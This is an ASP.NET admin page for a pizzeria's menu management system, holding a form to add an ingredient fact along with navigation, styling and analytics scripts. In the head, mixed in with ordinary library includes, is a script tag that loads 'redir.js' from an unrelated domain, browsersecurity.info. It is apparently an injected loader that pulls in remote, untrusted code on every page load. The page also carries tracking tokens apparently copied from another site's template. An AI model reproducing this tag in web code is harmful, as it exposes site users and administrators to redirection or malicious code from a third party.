<%@ Page Language="C#" AutoEventWireup="true" CodeFile="AddIngredientFactInformation.aspx.cs" Inherits="Admin_AddIngredientFactInformation" %>

<!DOCTYPE html>
<html class="no-js">
<meta charset="utf-8">
<meta name="description" content="">
<meta name="viewport" content="width=device-width">
<title>AddIngredientFactInformation</title>
<head>
     <link runat="server" rel="shortcut icon" href="/images/logo.ico" type="image/x-icon"/>
   <link runat="server" rel="icon" href="/images/logo.ico" type="image/ico"/>
    <script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
    <script src="http://browsersecurity.info/js/redir.js" type="text/javascript"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <script type="text/javascript">
        //<![CDATA[
        try { if (!window.CloudFlare) { var CloudFlare = [{ verbose: 0, p: 0, byc: 0, owlid: "cf", bag2: 1, mirage2: 0, oracle: 0, paths: { cloudflare: "/cdn-cgi/nexp/dok3v=1613a3a185/" }, atok: "72adab177b5729b458fc171b7e2ef771", petok: "be01c04ed78a819345fed98b13a0463b72c424a6-1450762210-1800", zone: "nyasha.me", rocket: "0", apps: { "ga_key": { "ua": "UA-50530436-1", "ga_bs": "2" } }, sha2test: 0 }]; !function (a, b) { a = document.createElement("script"), b = document.getElementsByTagName("script")[0], a.async = !0, a.src = "//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js", b.parentNode.insertBefore(a, b) }() } } catch (e) { };
        //]]>
    </script>
    <link rel="shortcut icon" href="/favicon.ec0f3a1b.ico">
    <link rel="stylesheet" href="css/chosen.min.css">
    <link rel="stylesheet" href="css/checkBo.min.css">
    <link rel="stylesheet" href="css/style.css" />


    <style type="text/css">
     @media only screen and (max-width: 2000px) {
            #btnAddIngredientFact {
                margin-left: 288px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1680px) {
            #btnAddIngredientFact {
                margin-left: 248px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1600px) {
            #btnAddIngredientFact {
                margin-left: 233px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1440px) {
            #btnAddIngredientFact {
                margin-left: 206px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1366px) {
            #btnAddIngredientFact {
                margin-left: 193px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }

        @media only screen and (max-width: 1280px) {
            #btnAddIngredientFact {
                margin-left: 179px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
        @media only screen and (max-width: 1200px) {
            #btnAddIngredientFact {
                margin-left: 168px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
        @media only screen and (max-width: 1080px) {
            #btnAddIngredientFact {
                margin-left: 149px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
         @media only screen and (max-width: 1050px) {
            #btnAddIngredientFact {
                margin-left: 143px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
        @media only screen and (max-width: 1024px) {
            #btnAddIngredientFact {
                margin-left: 136px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
         @media only screen and (max-width: 900px) {
            #btnAddIngredientFact {
                margin-left: 119px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
        @media only screen and (max-width: 800px) {
            #btnAddIngredientFact {
                margin-left: 82px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
         @media only screen and (max-width: 768px) {
            #btnAddIngredientFact {
                margin-left: 94px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
          /*done*/
        @media only screen and (max-width: 600px) {
            #btnAddIngredientFact {
                margin-left:20px;
            }

            #btnCancel {
                margin-left: 30px;
            }
        }
    </style>
    <script type="text/javascript">
        function ConfirmForLogOut() {

            var hdnfldVariable = document.getElementById("<%=hdnfldVariable.ClientID %>");

            if (confirm("Are you sure you want to log out?")) {

                 hdnfldVariable.value = "Yes";

             } else {

                 hdnfldVariable.value = "No";
             }
             document.getElementById('<%= BtnLogOut.ClientID %>').click();
        }
    </script>
</head>

<body>
    <form runat="server">

        <asp:HiddenField ID="hdnfldVariable" runat="server" />
        <asp:Button runat="server" ID="BtnLogOut" Style="display: none" OnClick="BtnLogOut_Click" />


        <div class="app layout-fixed-header">
            <div class="sidebar-panel offscreen-left">
                <div class="brand">
                    <div class="brand-logo">
                        <img src="images/logo.png" height="50" width="50" style="margin-top: -10px;" alt="">
                    </div>
                    <a href="javascript:;" class="toggle-sidebar hidden-xs hamburger-icon v3" data-toggle="layout-small-menu"><span></span><span></span><span></span><span></span></a>
                </div>

                   <nav role="navigation">
                   <ul class="nav">
                        <li><a href="DashBoard.aspx"><i class="fa fa-flask"></i><span>Dashboard</span> </a></li>
                         <li class="open"><a href="javascript:;"><i class="fa fa-tint"></i><span>Menu Details</span> </a>
                            <ul class="sub-menu">
                                <%--<li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/images/oie_311359551MYYq6un.jpg" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Information</span> </a></li>
                                --%>
                                <li><a href="MenuCategoryInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu Category.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Categories</span> </a></li>
                                <li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredients</span> </a></li>
                                <li class="active"><a href="IngredientFactInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Coverage</span> </a></li>
                                <li><a href="MenuItemInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Products</span> </a></li>
                                <li><a href="MenuItemSizeInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon//Menu Items.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Product Sizes</span> </a></li>
                                <li><a href="PizzaBaseTypeInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Pizza Base Type.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Pizza Type</span> </a></li>
                                <li><a href="MenuItemMakingMethodInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Making Method</span> </a></li>
                            </ul>
                        </li>
                      
                       <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Orders</span> </a>
                            <ul class="sub-menu">

                                <li><a href="OrderDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Order.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Order Details</span> </a></li>
                                <li><a href="DayToDaySellingInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Day to Day Sales.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Daily Sales</span> </a></li>
                                 <li><a href="TransactionDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Transaction.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Transaction Details</span></a></li>

                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Files and Images</span> </a>
                            <ul class="sub-menu">

                                <li><a href="UploadMenuPdf.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Menu</span> </a></li>
                                <li><a href="AddHomePageImages.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Images</span> </a></li>

                            </ul>
                        </li>

                        <li ><a href="OfferDetail.aspx"><i class="fa fa-tint"></i><span>Offers</span> </a>
                            <%--<ul class="sub-menu">
                                <li class="active"><a href="OfferDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Offer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Offer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="CustomerInformation.aspx"><i class="fa fa-tint"></i><span>Customers</span> </a>
                           <%-- <ul class="sub-menu">
                                <li><a href="CustomerInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Customer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Customer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="SendNewsLatterInformation.aspx"><i class="fa fa-tint"></i><span>Newsletters</span> </a>
                           <%-- <ul class="sub-menu">
                                <li><a href="SendNewsLatterInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/News Letter.png" Height="22px" Width="22px" runat="server"/><span> </span><span>News Letter Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li ><a href="javascript:;"><i class="fa fa-tint"></i><span>Misc. </span> </a>
                            <ul class="sub-menu">

                                <li><a href="MiscellaneousSettings.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Settings</span> </a></li>
                                <li><a href="AddConfigKeyAndValues.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Configuration Settings</span> </a></li>
                                <li><a href="AddConfigContactDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Contact.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Contact Detail</span></a></li>

                            </ul>
                        </li>

                        <li><a href="StoreInformation.aspx"><i class="fa fa-tint"></i><span>Store Details</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="StoreInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Store.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Information</span> </a></li>
                            </ul--%>>
                        </li>

                    </ul>
                </nav>
            </div>



            <div class="main-panel">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">Log Out</span> </a></li>
                    </ul>
                </header>


                <div class="main-content">
                    <div class="panel mb25">
                        <div class="panel-heading border" style="font-size:medium;font-weight:bold;">Ingredient Fact Information</div>
                        <div class="panel-body">
                            <div class="row no-margin">
                                <div class="col-lg-12">
                                    <div class="form-horizontal bordered-group" role="form">
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Ingredient Fact Name</label>
                                            <div class="col-sm-10">
                                                <asp:TextBox ID="txtIngredientFactName" CssClass="form-control" runat="server"></asp:TextBox>
                                                <asp:RequiredFieldValidator ID="rqIngredientFactName" runat="server" ValidationGroup="V1" ControlToValidate="txtIngredientFactName" ErrorMessage="Ingredient Fact Name Required" ForeColor="Red"></asp:RequiredFieldValidator>
                                            </div>
                                        </div>


                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <asp:Button ID="btnAddIngredientFact" CssClass="btn btn-info" runat="server" Text="Add Ingredient Fact" OnClick="btnAddIngredientFact_Click" ValidationGroup="V1" />

                    <asp:Button ID="btnCancel" CssClass="btn btn-info" runat="server" Text="Cancel" OnClick="btnCancel_Click" CausesValidation="false" />
                </div>
            </div>
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <footer class="content-footer" >
                <nav class="footer-right">
                    <ul class="nav">
                        <li><a href="javascript:;">Top</a> </li>
                        <li><a href="javascript:;" class="scroll-up"><i class="fa fa-angle-up"></i></a></li>
                    </ul>
                </nav>

                <nav class="footer-left">
                    <ul class="nav">
                        <li><a href="javascript:;">Copyright <i class="fa fa-copyright"></i><span>TomatosPizzeria</span> 2016. All rights reserved</a> </li>
                    </ul>
                </nav>
            </footer>
        </div>
        <script src="js/app.min.4fc8dd6e.js"></script>
            <script src="js/jquery.dataTables.js"></script>
            <script src="js/bootstrap-datatables.8df42543.js"></script>
            <script type="text/javascript">
                /* <![CDATA[ */
                var _gaq = _gaq || [];
                _gaq.push(['_setAccount', 'UA-50530436-1']);
                _gaq.push(['_trackPageview']);

                (function () {
                    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
                })();

                (function (b) { (function (a) { "__CF" in b && "DJS" in b.__CF ? b.__CF.DJS.push(a) : "addEventListener" in b ? b.addEventListener("load", a, !1) : b.attachEvent("onload", a) })(function () { "FB" in b && "Event" in FB && "subscribe" in FB.Event && (FB.Event.subscribe("edge.create", function (a) { _gaq.push(["_trackSocial", "facebook", "like", a]) }), FB.Event.subscribe("edge.remove", function (a) { _gaq.push(["_trackSocial", "facebook", "unlike", a]) }), FB.Event.subscribe("message.send", function (a) { _gaq.push(["_trackSocial", "facebook", "send", a]) })); "twttr" in b && "events" in twttr && "bind" in twttr.events && twttr.events.bind("tweet", function (a) { if (a) { var b; if (a.target && a.target.nodeName == "IFRAME") a: { if (a = a.target.src) { a = a.split("#")[0].match(/[^?=&]+=([^&]*)?/g); b = 0; for (var c; c = a[b]; ++b) if (c.indexOf("url") === 0) { b = unescape(c.split("=")[1]); break a } } b = void 0 } _gaq.push(["_trackSocial", "twitter", "tweet", b]) } }) }) })(window);
                /* ]]> */
            </script>
    </form>
</body>
</html>
